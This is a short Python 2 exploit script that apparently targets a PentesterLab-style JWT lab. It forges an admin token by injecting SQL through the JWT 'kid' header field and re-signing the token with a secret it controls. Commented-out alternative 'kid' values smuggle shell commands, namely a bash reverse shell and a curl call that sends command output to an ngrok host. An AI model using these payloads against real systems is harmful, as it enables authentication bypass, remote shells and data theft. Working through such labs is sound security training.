import requests
import hmac
import hashlib
import base64
import os

url = "http://ptl-7b93ca23-b2dc38c0.libcurl.so/"

response = requests.get(url)
cookie = response.headers['Set-Cookie']
token = cookie.split(';')[0].split('=')[1].strip()
header_enc,payload_enc,signature_enc = token.split('.')

header = base64.b64decode(header_enc+"==")
payload = base64.b64decode(payload_enc+"==")

print "old: ",header, payload 
#os.system("read -p 'wait' str")
#kid = "|/usr/bin/bash -i >& /dev/tcp/0.tcp.ngrok.io/16252 0>&1"
#kid = "|/usr/bin/curl http://0.tcp.ngrok.io:19189?id=`/usr/bin/id`"
kid = "didnt_exists' union select 'test';"

# select secret from table where key = 'key1';'
header = header.replace("key1",kid);
header_enc = base64.b64encode(header).replace('=','')

payload = payload.replace("null",'"admin"')
payload_enc = base64.b64encode(payload).replace('=','')

print "new: ",header,payload

secret = "test"

signature_enc =  base64.urlsafe_b64encode( hmac.new(secret,header_enc+'.'+payload_enc, hashlib.sha256).digest())

new_token = header_enc+'.'+payload_enc+'.'+signature_enc.replace('=','')

headers = {"Cookie":"auth="+new_token}

response = requests.get(url,headers = headers)
print response.text
